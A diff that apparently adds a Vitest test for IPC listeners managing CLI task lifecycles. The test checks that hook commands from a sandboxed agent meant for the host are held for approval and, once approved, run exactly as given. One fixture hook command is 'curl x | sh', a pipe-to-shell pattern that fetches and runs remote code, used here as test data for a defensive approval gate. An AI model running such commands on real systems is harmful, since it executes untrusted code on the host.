@@ -340,6 +340,50 @@ describe('useIPCListeners — CLI task lifecycle', () => {
     expect(
       vi.mocked(beginTransition).mock.calls.map(([, opts]) => [opts.hookControl, opts.sandbox, opts.surface]),
     ).toEqual([[{ mode: 'run', command: undefined }, 'nono', 'chat']]);
+
+    // So does a one-off command bound for the host, with no hook configured or with the host asked for,
+    // and once run it is that command which runs. Put in a sandbox, it runs at once.
+    useWaitingStore.setState({ items: [] });
+    vi.mocked(beginTransition).mockClear();
+    stubs.cliTaskCompletedCb!(
+      completedPayload({ fromPtyId: 'pty-agent', fromSandbox: true, hookMode: 'command', hookCommand: 'curl x | sh' }),
+    );
+    stubs.cliTaskStartedCb!(
+      basePayload({
+        fromPtyId: 'pty-agent',
+        fromSandbox: true,
+        hookMode: 'command',
+        hookCommand: 'make',
+        sandbox: 'none',
+      }),
+    );
+    stubs.cliTaskTransitionedCb!(
+      transitionPayload({
+        fromPtyId: 'pty-agent',
+        fromSandbox: true,
+        hookMode: 'command',
+        hookCommand: 'npm test',
+        sandbox: 'nono',
+      }),
+    );
+    await flush();
+    expect(completeTask).not.toHaveBeenCalled();
+    expect(vi.mocked(beginTransition).mock.calls.map(([, opts]) => [opts.newStatus, opts.hookControl])).toEqual([
+      ['in_review', { mode: 'command', command: 'npm test' }],
+    ]);
+    const held = useWaitingStore.getState().items;
+    expect(held.map((i) => i.kind === 'move' && [i.hookType, i.command, i.outsideSandbox])).toEqual([
+      ['done', 'curl x | sh', true],
+      ['start', 'make', true],
+    ]);
+    vi.mocked(beginTransition).mockClear();
+    held.forEach((item) => runWaiting(item));
+    expect(vi.mocked(completeTask).mock.calls.map(([opts]) => opts.hookControl)).toEqual([
+      { mode: 'command', command: 'curl x | sh' },
+    ]);
+    expect(vi.mocked(beginTransition).mock.calls.map(([, opts]) => [opts.hookControl, opts.sandbox])).toEqual([
+      [{ mode: 'command', command: 'make' }, 'none'],
+    ]);
   });
 });
 
